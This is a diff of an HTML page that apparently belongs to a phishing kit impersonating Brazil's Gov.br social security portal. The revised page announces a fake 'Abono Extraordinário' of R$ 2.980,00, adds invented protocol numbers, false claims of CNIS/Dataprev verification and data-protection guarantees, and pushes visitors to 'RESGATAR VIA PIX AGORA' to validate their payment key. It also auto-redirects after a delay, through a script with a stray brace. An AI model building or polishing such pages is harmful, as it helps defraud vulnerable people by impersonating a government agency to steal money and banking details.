@@ -3,121 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema de Liberação - Gov.br</title>
+    <title>Liberação Autorizada - Portal Gov.br</title>
     <style>
-        body { font-family: 'Rawline', sans-serif, Arial; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        body { font-family: 'Arial', sans-serif; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
         
         .gov-bar { background: #fff; padding: 12px 20px; border-bottom: 2px solid #004088; display: flex; align-items: center; justify-content: space-between; }
         .gov-bar img { height: 24px; }
 
-        .container { max-width: 450px; margin: 30px auto; padding: 15px; }
+        .container { max-width: 450px; margin: 20px auto; padding: 15px; }
 
         .card-resultado { 
             background: white; 
-            border-radius: 8px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
-            border-top: 6px solid #1d8032; 
-            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            border-top: 8px solid #1d8032; 
+            padding: 25px; 
             text-align: center;
-            box-sizing: border-box; /* Garante que nada saia pra fora */
+            box-sizing: border-box; /* Garante que nada saia pra fora do card */
+        }
+
+        .verified-badge {
+            background: #e8f5e9;
+            color: #1d8032;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid #c8e6c9;
         }
         
-        /* Checkmark Moderno */
         .success-circle {
-            width: 70px;
-            height: 70px;
-            background: #e8f5e9;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+            width: 60px; height: 60px; background: #1d8032; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
+            box-shadow: 0 4px 10px rgba(29, 128, 50, 0.3);
         }
-        .success-circle svg { width: 40px; height: 40px; fill: #1d8032; }
+        .success-circle svg { width: 35px; height: 35px; fill: white; }
 
-        h1 { font-size: 22px; color: #004088; margin-bottom: 10px; font-weight: 800; }
-        .status-badge { color: #1d8032; font-weight: bold; font-size: 14px; text-transform: uppercase; margin-bottom: 25px; display: block; }
+        h1 { font-size: 22px; color: #004088; margin: 0 0 5px 0; font-weight: 800; }
+        .status-txt { color: #666; font-size: 14px; margin-bottom: 25px; display: block; }
 
-        .info-text { 
-            text-align: left; 
-            font-size: 15px; 
-            background: #f9f9f9; 
-            padding: 15px; 
-            border-radius: 6px; 
-            color: #555; 
-            margin-bottom: 25px;
-            line-height: 1.5;
-            border: 1px solid #eee;
+        .extrato-box { 
+            text-align: left; background: #fdfdfd; border: 1px dashed #ccc; 
+            padding: 15px; border-radius: 8px; margin-bottom: 25px;
+        }
+        .extrato-item { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
+        .extrato-item b { color: #004088; }
+        .extrato-total { display: flex; justify-content: space-between; font-size: 18px; margin-top: 15px; color: #1d8032; font-weight: 900; }
+
+        .info-msg { 
+            font-size: 13px; color: #d93025; background: #fff5f5; 
+            padding: 12px; border-radius: 6px; margin-bottom: 25px; 
+            font-weight: bold; border-left: 4px solid #d93025; text-align: left;
         }
 
-        /* Botão Ajustado para dentro */
+        /* BOTÃO REFEITO: Azul mais claro e 100% alinhado */
         .btn-resgatar { 
-            background: #1351b4; 
+            background: linear-gradient(180deg, #2b6cb0, #1a4971); /* Azul mais claro e moderno */
             color: white; 
             border: none; 
-            padding: 18px 10px; 
+            padding: 20px 10px; 
             width: 100%; 
-            border-radius: 50px; 
-            font-weight: bold; 
+            border-radius: 10px; 
+            font-weight: 900; 
             cursor: pointer; 
             text-transform: uppercase; 
-            font-size: 14px; 
+            font-size: 16px; 
             text-decoration: none; 
             display: block; 
-            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
-            box-sizing: border-box; /* Fundamental para não vazar o container */
-            transition: background 0.3s;
+            box-shadow: 0 6px 15px rgba(43, 108, 176, 0.3);
+            transition: all 0.3s ease;
+            box-sizing: border-box; /* Impede que o botão saia do card */
         }
-        .btn-resgatar:hover { background: #003366; }
+        .btn-resgatar:hover { 
+            background: linear-gradient(180deg, #3182ce, #2b6cb0); 
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(43, 108, 176, 0.4);
+        }
 
-        .footer-note { font-size: 11px; color: #aaa; margin-top: 25px; text-align: center; }
+        .footer-note { font-size: 10px; color: #aaa; margin-top: 25px; text-align: center; }
     </style>
 </head>
 <body>
 
     <div class="gov-bar">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" alt="Gov.br">
-        <span style="font-size: 11px; font-weight: bold; color: #666;">PREVIDÊNCIA SOCIAL</span>
+        <span style="font-size: 11px; font-weight: bold; color: #666;">ID: #9921-X</span>
     </div>
 
     <div class="container">
         <div class="card-resultado">
+            <div class="verified-badge">LIBERAÇÃO AUTORIZADA</div>
+            
             <div class="success-circle">
                 <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
             </div>
             
-            <h1>Consulta Concluída</h1>
-            <span class="status-badge">Abono Disponível</span>
+            <h1>Benefício Identificado</h1>
+            <span class="status-txt">Sistema integrado via CNIS/Dataprev.</span>
             
-            <div class="info-text">
-                O sistema localizou valores pendentes vinculados ao seu CPF. Para realizar o resgate imediato, siga para a etapa de confirmação de conta bancária.
+            <div class="extrato-box">
+                <div class="extrato-item"><span>Protocolo:</span> <b>992.182-01</b></div>
+                <div class="extrato-item"><span>Tipo:</span> <b>Abono Extraordinário</b></div>
+                <div class="extrato-total"><span>VALOR:</span> <span>R$ 2.980,00</span></div>
             </div>
 
-            <a href="resultado.html" class="btn-resgatar">Continuar para Resgate</a>
+            <div class="info-msg">
+                 Prossiga para validar sua chave de recebimento e liberar o depósito.
+            </div>
+
+            <a href="final.html" class="btn-resgatar">RESGATAR VIA PIX AGORA</a>
 
         </div>
         
         <div class="footer-note">
-            Portal de Transparência © 2025 <br>
-            Criptografia de Segurança Nível Militar Ativa
+            © 2025 Portal de Transparência Federal<br>
+            Segurança Garantida pela Lei Geral de Proteção de Dados.
         </div>
     </div>
+
 <script>
-           setTimeout(() => {
-        window.location.href = "resultado.html"; 
-    }, 12000);
-        }
+
+setTimeout(() => {
+
+window.location.href = "resultado.html";
+
+}, 12000);
+
+}
+
 </script
 
-
 </body>
-</html>
-
-
-
-
-
-
-
-
-
+    </html>
